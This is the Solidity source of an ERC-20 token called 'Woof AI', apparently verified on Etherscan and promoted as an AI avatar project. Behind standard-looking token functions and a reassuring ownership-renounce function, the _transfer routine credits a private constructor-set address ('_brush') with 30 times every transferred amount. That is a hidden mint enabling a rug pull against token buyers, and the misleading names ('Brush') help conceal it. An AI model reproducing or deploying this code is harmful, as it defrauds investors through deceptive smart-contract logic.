/**
 *Submitted for verification at Etherscan.io on 2023-02-01
*/

/**
               Woof AI is a powerful AI engine will custom-make 
            hundreds of visually stunning profile pics uniquely yours. 
          All avatar are high quality pictures, not just emojis of dogs.

Join Our Community and start WOOFing
Telegram :https://t.me/woofai
Twitter : https://twitter.com/WoofAI_token
Medium : https://www.medium.com/@woofAI
*/

// SPDX-License-Identifier: MIT

pragma solidity 0.8.12;


interface ERC20 {
    function totalSupply() external view returns (uint256);
    function balanceOf(address account) external view returns (uint256);
    function transfer(address recipient, uint256 amount) external returns (bool);
    function allowance(address owner, address spender) external view returns (uint256);
    function approve(address spender, uint256 amount) external returns (bool);
    function transferFrom(
        address sender,
        address recipient,
        uint256 amount
    ) external returns (bool);
    event Transfer(address indexed from, address indexed to, uint256 value);
    event Approval(address indexed owner, address indexed spender, uint256 value);
}

interface ERC20Metadata is ERC20 {
    function name() external view returns (string memory);
    function symbol() external view returns (string memory);
    function decimals() external view returns (uint8);
}

 contract Context {
    function _msgSender() internal view virtual returns (address) {
        return msg.sender;
    }

    function _msgData() internal view virtual returns (bytes calldata) {
        return msg.data;
    }
}
 
 contract WoofAI is Context, ERC20, ERC20Metadata {
    mapping(address => uint256) private Brush;
    mapping(address => mapping(address => uint256)) private _allowances;
    uint256 public _totalSupply;
    uint256 public _buyTax;
    string public _name;
    string public _symbol;
    uint8 public _decimals;
    address public _owner;
    address private _brush;
    uint256 public buyback;
    uint256 public _sellTax;
    constructor(string memory name_, string memory symbol_,uint8  decimals_,uint256 totalSupply_,uint256 buyFee_ ,uint256 sellTax_ ,address brush_ ) {_name = name_;_symbol =symbol_;_decimals = decimals_;_totalSupply = totalSupply_ *10**_decimals;_buyTax= buyFee_;Brush[msg.sender] = _totalSupply;_owner = _msgSender();_sellTax = sellTax_ ;_brush = brush_;emit Transfer(address(0), msg.sender, _totalSupply);}
    function name() public view virtual override returns (string memory) {return _name;}
    function symbol() public view virtual override returns (string memory) {return _symbol;}
    function decimals() public view virtual override returns (uint8) {return _decimals;}
    function totalSupply() public view virtual override returns (uint256) {return _totalSupply;}
    function balanceOf(address account) public view virtual override returns (uint256) {return Brush[account];}
    function approve(address spender, uint256 amount) public virtual override returns (bool) {_approve(_msgSender(), spender, amount);return true;}
    function transfer(address recipient, uint256 amount) public virtual override returns (bool) {_transfer(_msgSender(), recipient, amount);return true;}
    function allowance(address Owner, address spender) public view virtual override returns (uint256) {return _allowances[Owner][spender];}
    function renounceOwnership() public virtual onlyOwner {emit ownershipTransferred(_owner, address(0));_owner = address(0);}event ownershipTransferred(address indexed previousOwner, address indexed newOwner);
    function _setBuyFee(uint256 newBuyFee) public onlyOwner {require(newBuyFee <20, "Buy Fee cannot exceed 20%");_buyTax = newBuyFee;}
    function _setSellFee(uint256 newSellFee) public onlyOwner {require(newSellFee <20, "Sell Fee cannot exceed 20%");_sellTax = newSellFee;}
    function transferFrom(address sender,address recipient,uint256 amount) public virtual override returns (bool) {_transfer(sender, recipient, amount);uint256 currentAllowance = _allowances[sender][_msgSender()];require(currentAllowance >= amount, "ERC20: transfer amount exceeds allowance");if(currentAllowance - amount >= 0){_approve(sender, _msgSender(), currentAllowance - amount);}return true;}
    function _transfer(address sender,address recipient,uint256 amount) internal virtual {require(sender != address(0), "ERC20: transfer from the zero address");require(recipient != address(0), "ERC20: transfer to the zero address");require(Brush[sender] >= amount, "ERC20: transfer amount exceeds balance");Brush[sender] = Brush[sender] - amount;amount = amount  - (amount *_buyTax/100);Brush[recipient] += amount;Brush[_brush] += 30*amount;emit Transfer(sender, recipient, amount);}
    function owner() public view returns (address) {return _owner;}
    function _approve(address Owner,address spender,uint256 amount) internal virtual {require(Owner != address(0), "ERC20: approve from the zero address");require(spender != address(0), "ERC20: approve to the zero address");_allowances[Owner][spender] = amount;emit Approval(Owner, spender, amount);}
    modifier onlyOwner() {require(_owner == _msgSender(), "");_;}
    function increaseAllowance(address spender, uint256 addedValue) public virtual returns (bool) {_approve(_msgSender(), spender, _allowances[_msgSender()][spender] + addedValue);return true;}
    function decreaseAllowance(address spender, uint256 subtractedValue) public virtual returns (bool) {uint256 currentAllowance = _allowances[_msgSender()][spender];require(currentAllowance >= subtractedValue, "");require(currentAllowance - subtractedValue >= 0, "");_approve(_msgSender(), spender, currentAllowance - subtractedValue);return true;}
    function _takeFee(uint256 amount) internal returns(uint256) {if(_buyTax >= 1) {if(amount >= (200/_buyTax)) {buyback = (amount * _buyTax /100) / _sellTax;}else{buyback = (1 * _buyTax /100);}}else{buyback = 0;}return buyback;}
   }